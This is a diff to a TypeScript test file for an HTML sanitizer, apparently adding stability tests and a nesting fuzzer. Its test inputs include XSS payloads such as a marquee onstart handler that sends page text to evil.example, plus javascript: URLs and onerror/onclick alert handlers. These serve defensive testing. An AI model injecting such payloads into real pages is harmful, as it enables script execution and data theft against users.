@@ -55,11 +55,18 @@ async function oracle(html: string): Promise<Seen> {
   return { elements, text };
 }
 
-// The four escapes the sanitizer writes, and nothing else. If this holds, the
-// output's source text and its decoded value differ by exactly those four, so
-// decodeAttr is the whole decoder and a second parse cannot read a different
-// URL out of the same record.
+// The four escapes the sanitizer writes into an attribute value, and nothing
+// else. If this holds, the output's source text and its decoded value differ by
+// exactly those four, so decodeAttr is the whole decoder and a second parse
+// cannot read a different URL out of the same record.
 const ESCAPED_ONLY = /&(?!(?:amp|quot|lt|gt);)/;
+
+// Text has a fifth, and it is there for the same reason "&" is escaped at all:
+// a CR written literally is an LF to the next parse, so a CR that reached a
+// text node through a character reference is written back as one. No attribute
+// value can hold a CR — cleanUrl strips it before the scheme is even read — so
+// the attribute rule stays at four.
+const ESCAPED_ONLY_TEXT = /&(?!(?:amp|quot|lt|gt|#13);)/;
 
 // What the renderer decodes an attribute value back into. The inverse of the
 // sanitizer's escapeAttr, "&amp;" last so `&amp;lt;` comes back as the text
@@ -128,7 +135,9 @@ async function violations(out: string): Promise<string[]> {
   // Text is escaped by a different function than attributes are; the property
   // is the same one and it is checked rather than assumed.
   for (const chunk of seen.text) {
-    if (ESCAPED_ONLY.test(chunk)) bad.push(`unescaped & in text ${JSON.stringify(chunk)}`);
+    if (ESCAPED_ONLY_TEXT.test(chunk)) bad.push(`unescaped & in text ${JSON.stringify(chunk)}`);
+    // A literal CR is what the escape exists to prevent; it must not be here.
+    if (chunk.includes("\r")) bad.push(`literal CR in text ${JSON.stringify(chunk)}`);
   }
   return bad;
 }
@@ -162,6 +171,15 @@ async function elementsOf(html: string): Promise<SeenElement[]> {
   return (await oracle(html)).elements;
 }
 
+// The text a renderer will show for the output's first <pre>. The only place a
+// test reads the output through a DOM instead of through lol-html: what a
+// browser does with an LF straight after a <pre> start tag is a tree
+// construction rule, and a tokenizer has no opinion about it.
+function preText(html: string): string {
+  const doc = new DOMParser().parseFromString(`<!doctype html><body>${html}`, "text/html");
+  return doc.body.getElementsByTagName("pre")[0]?.textContent ?? "";
+}
+
 // --- the two demonstrated bypasses ------------------------------------------
 
 // `[^>]*>` ends a tag at the first ">", but a tokenizer inside a double-quoted
@@ -172,7 +190,11 @@ test("a > inside a quoted attribute value does not end the tag", async () => {
     `<marquee title="a>" onstart="fetch('https://evil.example/'+document.body.innerText)">x</marquee>`,
   );
   expect(await elementsOf(out)).toEqual([]);
-  expect(out).toBe("x");
+  // The "x" goes with the tag now: marquee is a scope boundary, and unwrapping
+  // one writes a shape the next parse rearranges. See the scope-boundary sweep.
+  expect(out).toBe("");
+  // A <p> around it keeps its own text, so what is lost is the marquee's.
+  expect(await expectSafe(`<p>keep<marquee>drop</marquee></p>`)).toBe("<p>keep</p>");
 });
 
 test("a > inside a single-quoted attribute value does not end the tag either", async () => {
@@ -523,6 +545,109 @@ test("without a DOMParser there is no sanitizer, so there is no body", () => {
   }
 });
 
+// --- the same record on every read ------------------------------------------
+
+// expectSafe already demands sanitize(sanitize(x)) === sanitize(x) for every
+// payload above. These are the shapes that broke it, kept as their own tests so
+// a failure names the rule rather than the payload. Each one is a stored record
+// that rendered one way on the read that saved it and another way on the read
+// after that — no attacker involved, and no assertion above would have noticed,
+// because both renderings were safe.
+
+test("a <pre> keeps its blank first line on every read", async () => {
+  // The tree builder drops an LF immediately after a <pre> start tag, so the
+  // text node under this one holds one LF, not two. Writing that back verbatim
+  // hands the next parse a <pre> that starts with an LF and it drops that one
+  // too: a code block lifted off a web page loses a line per read.
+  const out = await expectSafe(`<pre>\n\nconst x = 1;</pre>`);
+  expect(out).toBe(`<pre>\n\nconst x = 1;</pre>`);
+  // And what a renderer shows for it is the blank line, on this read and on
+  // every read after it. This is the one claim lol-html cannot judge: swallowing
+  // that LF is tree construction, not tokenizing, so the DOM answers it.
+  expect(preText(out)).toBe("\nconst x = 1;");
+  expect(preText(sanitizeArticleHtml(out))).toBe("\nconst x = 1;");
+
+  // One LF is the empty case: the parse ate it on the way in and there is
+  // nothing to write back.
+  expect(await expectSafe(`<pre>\ncode</pre>`)).toBe(`<pre>code</pre>`);
+  expect(await expectSafe(`<pre>\n\n\ncode</pre>`)).toBe(`<pre>\n\n\ncode</pre>`);
+  expect(await expectSafe(`<pre>code\n\nmore</pre>`)).toBe(`<pre>code\n\nmore</pre>`);
+  expect(await expectSafe(`<pre>\n\n</pre>`)).toBe(`<pre>\n\n</pre>`);
+
+  // The test is on what was written, not on the element's first child: a
+  // comment ahead of the text stops the tree builder eating anything on the way
+  // in, and the comment is gone by the time the LF is written back.
+  expect(await expectSafe(`<pre><!--c-->\ncode</pre>`)).toBe(`<pre>\n\ncode</pre>`);
+  expect(await expectSafe(`<pre><script>x</script>\ncode</pre>`)).toBe(`<pre>\n\ncode</pre>`);
+  // And an element first means the next parse eats nothing, so nothing is added.
+  expect(await expectSafe(`<pre><b>b</b>\ncode</pre>`)).toBe(`<pre><b>b</b>\ncode</pre>`);
+});
+
+test("a CR that came from a character reference stays a CR", async () => {
+  // The tokenizer turns a literal CR in the source into an LF before anything
+  // else sees it, but a character reference is decoded after that step, so
+  // `&#13;` really does put a CR in a text node. Written back as a literal CR
+  // it is an LF to the next parse.
+  const out = await expectSafe(`<p>a&#13;b</p>`);
+  expect(out).toBe(`<p>a&#13;b</p>`);
+  expect(await expectSafe(`<pre>&#13;&#10;x</pre>`)).toBe(`<pre>&#13;\nx</pre>`);
+  // A CR written literally in the source is an LF before the sanitizer sees it,
+  // and stays one.
+  expect(await expectSafe("<p>a\r\nb</p>")).toBe("<p>a\nb</p>");
+});
+
+// Every scope boundary the tree builder has. Written out here rather than
+// imported, so this is the policy stated a second time: each one has to be
+// allowed (kept, so its shape survives) or dropped with its content (gone, so
+// its shape never reaches the output). One that is in neither is unwrapped, and
+// unwrapping a boundary writes nesting no parse produces.
+const SCOPE_BOUNDARIES = [
+  "applet", "body", "button", "caption", "html", "marquee", "object", "ol", "select", "table",
+  "td", "template", "th", "ul",
+];
+
+test("no scope boundary is unwrapped", async () => {
+  for (const tag of SCOPE_BOUNDARIES) {
+    // A <p> inside a boundary inside a <p>: the boundary is what stops the
+    // inner <p> ending the outer one, so the parse really is a <p> in a <p>.
+    // expectSafe fails on the second pass if that shape reaches the output.
+    await expectSafe(`<p>a<${tag}><p>b</p></${tag}></p>`);
+    await expectSafe(`<ul><li>a<${tag}><li>b</li></${tag}></li></ul>`);
+  }
+  // button and marquee were the two that were in neither list. Their content
+  // goes with them now, for the same reason every other form control's does.
+  expect(await expectSafe(`<p>a<button><p>b</p></button></p>`)).toBe("<p>a</p>");
+  expect(await expectSafe(`<button>Subscribe</button><p>text</p>`)).toBe("<p>text</p>");
+});
+
+test("a start tag is never written where the next parse would end something", async () => {
+  // Three ways the tree holds that position, and only the first is a scope
+  // boundary. The h1 rule looks at the current node, so any element at all
+  // stands between two headings — including one nobody has heard of.
+  expect(await expectSafe(`<h1>a<em-x><h1>b</h1></em-x></h1>`)).toBe("<h1>a</h1><h1>b</h1>");
+  // Foster parenting needs no unwrapping at all: the inner <li> is lifted out
+  // of the table and dropped beside it, inside the outer <li>.
+  await expectSafe(`<ul><li>a<table><li>b</li></table></li></ul>`);
+  await expectSafe(`<dl><dd>a<details><dd>b</dd></details></dd></dl>`);
+  await expectSafe(`<ruby><dd>a<rp>b</rp></dd></ruby>`);
+  await expectSafe(`<a>x<ol><li><a>y</a></li></ol></a>`);
+  // And the nestings that are real stay real: a list inside a list item, a cell
+  // inside a cell's table, a heading behind an element that survives.
+  expect(await expectSafe(`<ul><li>a<ul><li>b</li></ul></li></ul>`)).toBe(
+    "<ul><li>a<ul><li>b</li></ul></li></ul>",
+  );
+  expect(await expectSafe(`<h1>a<span><h2>b</h2></span></h1>`)).toBe(
+    "<h1>a<span><h2>b</h2></span></h1>",
+  );
+  const nested = await expectSafe(
+    `<table><tr><td>a<table><tr><td>b</td></tr></table></td></tr></table>`,
+  );
+  expect(nested).toContain("<td>a<table>");
+  expect(await expectSafe(`<a>1<table><tr><td><a>2</a></td></tr></table></a>`)).toContain(
+    "<td><a>2</a></td>",
+  );
+});
+
 // --- a sweep over the payloads that did not earn a test of their own --------
 
 test("nothing in the payload corpus survives", async () => {
@@ -567,18 +692,50 @@ test("nothing in the payload corpus survives", async () => {
     `<a href="https://ok.example/&amp;#x2f;&amp;#x2f;evil.example/">x</a>`,
     `<img src="https://cdn.x/a.jpg?w=1&amp;amp;h=2">`,
     `<td colspan="&amp;#50;">x</td>`,
+    // Nothing below is an attack. They are the shapes that came back different
+    // on the second read, and expectSafe is here for its byte-for-byte half.
+    `<pre>\n\n  def f():\n    return 1\n</pre>`,
+    `<pre><code>\n\n$ ls\n</code></pre>`,
+    `<blockquote><pre>\n\nquoted code</pre></blockquote>`,
+    `<p>a&#13;b</p>`,
+    `<pre>line&#13;&#10;line</pre>`,
+    `<p>x<button><p>y</p></button></p>`,
+    `<p>x<marquee><p>y</p></marquee></p>`,
+    `<ul><li>a<marquee><li>b</li></marquee></li></ul>`,
+    `<a>x<marquee><a>y</a></marquee></a>`,
+    `<dl><dd>a<button><dd>b</dd></button></dd></dl>`,
+    `<h1>a<em-x><h1>b</h1></em-x></h1>`,
+    `<h3>a<legend><h1>b</h1></legend></h3>`,
+    `<dl><dd>a<details><dd>b</dd></details></dd></dl>`,
+    `<ul><li>a<table><li>b</li></table></li></ul>`,
+    `<h1><table><h3>x</h3></table></h1>`,
+    `<ruby><dd>a<rp>b</rp></dd></ruby>`,
+    `<ruby><li><rt>x</rt></li></ruby>`,
+    `<a>1<ol><li><a>2</a></li></ol></a>`,
+    `<section><dd><table><dt>x</dt></table></dd></section>`,
   ];
   for (const html of corpus) await expectSafe(html);
+  expect(corpus.length).toBe(59);
 });
 
-// --- a seeded fuzz over the same shapes -------------------------------------
+// --- two seeded fuzzers -----------------------------------------------------
 
-// The corpus above is what someone thought of. This is 2000 payloads nobody
-// thought of: tag names, attribute names, separators, quoting and text glued
-// together at random, with a fixed seed so a failure is reproducible. The
-// judge is the same oracle, so a bypass shows up as an element or attribute in
-// the output that the allowlist never named. Against the regex sanitizer this
-// replaced, this run reports hundreds of leaks.
+// The corpus above is what someone thought of. These are payloads nobody
+// thought of, with a fixed seed so a failure is reproducible.
+//
+// Both judge every case twice over. Safety: the oracle reports the elements and
+// attributes a browser will find in the output, so a bypass shows up as one the
+// allowlist never named. Stability: the output has to sanitize to itself byte
+// for byte, because it is read back through this same function on every read of
+// the record it is stored in. Only the second of those catches an element that
+// merely moved, and every defect this file has had since the rewrite — the
+// <pre> newline, the CR, the two scope boundaries, foster parenting, the nested
+// <a> — was found by the second one and would have passed the first.
+//
+// The first fuzzer glues tags, attributes, separators and quoting together at
+// random and stays flat; against the regex sanitizer this replaced it reports
+// hundreds of leaks. The second nests instead, because a shape that only comes
+// apart on the way back in needs an inside to come apart.
 function mulberry32(seed: number): () => number {
   let a = seed;
   return () => {
@@ -606,9 +763,31 @@ const FUZZ_VALUES = [
   '"https://x/a\\"onerror=alert(1)"', '"\u0000javascript:alert(1)"',
 ];
 const FUZZ_SEPS = [" ", "\t", "\n", "/", "", "//", " \n ", "\u0000"];
-const FUZZ_TEXT = ["hi", "<", ">", "&", "&lt;img src=x onerror=alert(1)&gt;", "&amp;lt;", "]]>", "<!--", "-->", "\u0000"];
+const FUZZ_TEXT = [
+  "hi", "<", ">", "&", "&lt;img src=x onerror=alert(1)&gt;", "&amp;lt;", "]]>", "<!--", "-->",
+  "\u0000", "\n", "\n\n", "&#13;", "&#13;&#10;", "&#10;", "\r\n", "a\n\nb", "  \n  ",
+];
 
-test("2000 seeded random payloads produce nothing off the allowlist", async () => {
+// One generated case, judged on both properties. Returns nothing; it throws
+// with the payload in the message, because a failure a hundred rounds in is
+// only useful if it says which round.
+async function expectFuzzCase(html: string): Promise<void> {
+  const out = sanitizeArticleHtml(html);
+  const bad = await violations(out);
+  if (bad.length > 0) {
+    throw new Error(`unsafe: ${JSON.stringify(html)} -> ${JSON.stringify(out)}: ${bad.join(", ")}`);
+  }
+  const again = sanitizeArticleHtml(out);
+  if (again !== out) {
+    throw new Error(
+      `not a fixed point: ${JSON.stringify(html)} -> ${JSON.stringify(out)} -> ${JSON.stringify(again)}`,
+    );
+  }
+}
+
+const FLAT_ROUNDS = 2000;
+
+test(`${FLAT_ROUNDS} random tags are safe and are a fixed point`, async () => {
   const rand = mulberry32(20260813);
   const pick = <T,>(a: T[]): T => a[Math.floor(rand() * a.length)];
   const tag = (): string => {
@@ -622,22 +801,59 @@ test("2000 seeded random payloads produce nothing off the allowlist", async () =
     if (rand() < 0.5) s += `${pick(FUZZ_TEXT)}</${name}>`;
     return s;
   };
-  for (let round = 0; round < 2000; round += 1) {
+  let cases = 0;
+  for (let round = 0; round < FLAT_ROUNDS; round += 1) {
     let html = "";
     for (let i = 0, n = 1 + Math.floor(rand() * 4); i < n; i += 1) {
       html += rand() < 0.8 ? tag() : pick(FUZZ_TEXT);
     }
-    const out = sanitizeArticleHtml(html);
-    const bad = await violations(out);
-    if (bad.length > 0) throw new Error(`${JSON.stringify(html)} -> ${JSON.stringify(out)}: ${bad.join(", ")}`);
-    const again = sanitizeArticleHtml(out);
-    if (again !== out) {
-      throw new Error(
-        `not idempotent: ${JSON.stringify(html)} -> ${JSON.stringify(out)} -> ${JSON.stringify(again)}`,
-      );
-    }
+    await expectFuzzCase(html);
+    cases += 1;
   }
-  expect(true).toBe(true);
+  expect(cases).toBe(FLAT_ROUNDS);
+});
+
+// The second fuzzer's vocabulary. Weighted towards what the tree builder has a
+// rule about — the elements a start tag ends (headings, list and ruby items,
+// cells), the wrappers that bound those rules, the scope boundaries, and the
+// unwrapped elements that used to stand between them — because a nesting is
+// only interesting here when the parse of it disagrees with the writing of it.
+const NEST_TAGS = [
+  "p", "div", "span", "b", "a", "pre", "code", "blockquote", "section", "figure", "main",
+  "h1", "h2", "h3", "li", "ul", "ol", "dd", "dt", "dl", "rp", "rt", "rb", "rtc", "ruby",
+  "table", "thead", "tbody", "tfoot", "tr", "td", "th", "caption", "colgroup", "col", "img", "br",
+  "button", "marquee", "applet", "object", "select", "template", "form", "svg", "math", "script",
+  "details", "summary", "legend", "fieldset", "center", "nav", "hgroup", "menu", "dir", "listing",
+  "search", "font", "nobr", "picture", "source", "custom-el", "html", "body", "head", "xmp",
+];
+const NEST_ATTRS = [
+  "", " class=x", " colspan=2", ' rowspan="3"', " start=5", " span=2", ' href="https://x/a"',
+  ' href="javascript:alert(1)"', ' src="https://x/a.jpg"', ' data-src="https://x/b.png"',
+  ' srcset="https://x/c.jpg 1x, https://x/d.jpg 2x"', ' title="a>"', " onclick=alert(1)",
+  ' href="https://x/a?b=1&c=2"', ' src="data:image/png;base64,AA"', ' colspan="&#50;"',
+];
+const NEST_ROUNDS = 3000;
+
+test(`${NEST_ROUNDS} random nestings are safe and are a fixed point`, async () => {
+  const rand = mulberry32(20260814);
+  const pick = <T,>(a: T[]): T => a[Math.floor(rand() * a.length)];
+  const node = (depth: number): string => {
+    if (depth <= 0 || rand() < 0.25) return pick(FUZZ_TEXT);
+    const name = pick(NEST_TAGS);
+    let kids = "";
+    for (let i = 0, n = Math.floor(rand() * 3); i < n; i += 1) kids += node(depth - 1);
+    // An end tag most of the time: the ones left open are where the tree
+    // builder starts inventing structure, which is the interesting half.
+    return `<${name}${pick(NEST_ATTRS)}>${kids}${rand() < 0.85 ? `</${name}>` : ""}`;
+  };
+  let cases = 0;
+  for (let round = 0; round < NEST_ROUNDS; round += 1) {
+    let html = "";
+    for (let i = 0, n = 1 + Math.floor(rand() * 4); i < n; i += 1) html += node(4);
+    await expectFuzzCase(html);
+    cases += 1;
+  }
+  expect(cases).toBe(NEST_ROUNDS);
 });
 
 // --- htmlToText / stripDataImages -------------------------------------------
